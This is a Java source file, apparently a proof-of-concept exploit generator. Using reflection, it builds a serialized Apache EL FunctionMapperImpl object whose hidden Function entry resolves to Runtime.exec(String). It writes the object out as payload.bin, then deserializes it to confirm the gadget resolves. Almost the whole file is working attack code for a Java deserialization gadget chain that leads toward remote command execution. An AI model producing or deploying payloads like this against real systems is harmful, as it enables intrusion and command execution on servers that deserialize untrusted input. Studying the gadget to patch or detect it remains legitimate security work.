import java.io.*;
import java.lang.reflect.*;
import java.util.concurrent.ConcurrentHashMap;
import org.apache.el.lang.FunctionMapperImpl;

/**
 * Generates a serialized FunctionMapperImpl payload containing a Function
 * entry that resolves to Runtime.exec(String) on deserialization.
 *
 * The payload exploits the fact that FunctionMapperImpl.Function stores
 * class/method references as plain strings (owner, name, types) and
 * reconstructs the Method handle via ReflectionUtil.forName() with no
 * whitelist when getMethod() is called post-deserialization.
 */
public class PayloadGenerator {
    public static void main(String[] args) throws Exception {
        // 1. Create the FunctionMapperImpl instance
        FunctionMapperImpl mapper = new FunctionMapperImpl();

        // 2. Access the inner Function class via reflection
        Class<?> fnClass = Class.forName("org.apache.el.lang.FunctionMapperImpl$Function");

        // 3. Create a Function instance with attacker-controlled class/method strings
        Constructor<?> ctor = fnClass.getDeclaredConstructor();
        ctor.setAccessible(true);
        Object maliciousFunc = ctor.newInstance();

        // Set owner = "java.lang.Runtime" (class to load)
        Field ownerField = fnClass.getDeclaredField("owner");
        ownerField.setAccessible(true);
        ownerField.set(maliciousFunc, "java.lang.Runtime");

        // Set name = "exec" (method to resolve)
        Field nameField = fnClass.getDeclaredField("name");
        nameField.setAccessible(true);
        nameField.set(maliciousFunc, "exec");

        // Set types = ["java.lang.String"] (parameter types)
        Field typesField = fnClass.getDeclaredField("types");
        typesField.setAccessible(true);
        typesField.set(maliciousFunc, new String[]{"java.lang.String"});

        // Set prefix and localName for resolveFunction() lookup
        Field prefixField = fnClass.getDeclaredField("prefix");
        prefixField.setAccessible(true);
        prefixField.set(maliciousFunc, "evil");

        Field localNameField = fnClass.getDeclaredField("localName");
        localNameField.setAccessible(true);
        localNameField.set(maliciousFunc, "cmd");

        // 4. Put the Function into the FunctionMapperImpl's internal map
        Field functionsField = FunctionMapperImpl.class.getDeclaredField("functions");
        functionsField.setAccessible(true);

        @SuppressWarnings("unchecked")
        ConcurrentHashMap<String, Object> functions =
            (ConcurrentHashMap<String, Object>) functionsField.get(mapper);
        if (functions == null) {
            functions = new ConcurrentHashMap<>();
            functionsField.set(mapper, functions);
        }
        functions.put("evil:cmd", maliciousFunc);

        // 5. Serialize to payload.bin
        String outputFile = args.length > 0 ? args[0] : "payload.bin";
        FileOutputStream fos = new FileOutputStream(outputFile);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(mapper);
        oos.close();

        System.out.println("[+] Payload written to " + outputFile);
        System.out.println("[+] Size: " + new File(outputFile).length() + " bytes");
        System.out.println("[+] Gadget: FunctionMapperImpl -> Function(Runtime.exec)");
        System.out.println();

        // 6. Verify: deserialize and trigger
        FileInputStream fis = new FileInputStream(outputFile);
        ObjectInputStream ois = new ObjectInputStream(fis);
        FunctionMapperImpl deserialized = (FunctionMapperImpl) ois.readObject();
        ois.close();

        java.lang.reflect.Method m = deserialized.resolveFunction("evil", "cmd");
        System.out.println("[+] Deserialized and resolved method: " + m);
        System.out.println("[+] Payload verification successful - method handle obtained");
    }
}
